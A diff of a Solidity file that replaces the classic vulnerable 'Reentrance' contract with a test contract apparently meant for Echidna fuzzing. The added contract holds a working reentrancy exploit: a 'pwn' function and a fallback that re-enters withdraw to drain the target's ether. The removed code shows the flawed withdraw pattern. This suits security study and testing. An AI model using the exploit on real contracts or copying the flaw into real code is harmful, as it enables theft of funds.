@@ -1,29 +1,31 @@
 pragma solidity ^0.6.0;
 
-import '../@openzeppelin-solidity/contracts/math/SafeMath.sol';
+import 'Reentrancy.sol';
 
-contract Reentrance {
-  
-  using SafeMath for uint256;
-  mapping(address => uint) public balances;
+contract Test {
+  Reentrance r;
 
-  function donate(address _to) public payable {
-    balances[_to] = balances[_to].add(msg.value);
+  constructor() public payable {
+    r = new Reentrance();
+    r.donate.value(10 ether)(address(0x12345));
   }
 
-  function balanceOf(address _who) public view returns (uint balance) {
-    return balances[_who];
+  function donate() public {
+    r.donate.value(1 ether)(address(this));
   }
 
-  function withdraw(uint _amount) public {
-    if(balances[msg.sender] >= _amount) {
-      (bool result, bytes memory data) = msg.sender.call.value(_amount)("");
-      if(result) {
-        _amount;
-      }
-      balances[msg.sender] -= _amount;
-    }
+  function pwn() public {
+    r.withdraw(1 ether);
   }
 
-  fallback() external payable {}
+  fallback() external payable {
+    uint steal = address(msg.sender).balance;
+    steal = steal > 1 ether ? 1 ether : steal;
+    if (steal != 0)
+      address(msg.sender).call.gas(100 ether)(abi.encodeWithSignature("withdraw(uint256)", steal));
+  }
+
+  function echidna_test_balance() public returns (bool) {
+    return address(r).balance > 0;
+  }
 }
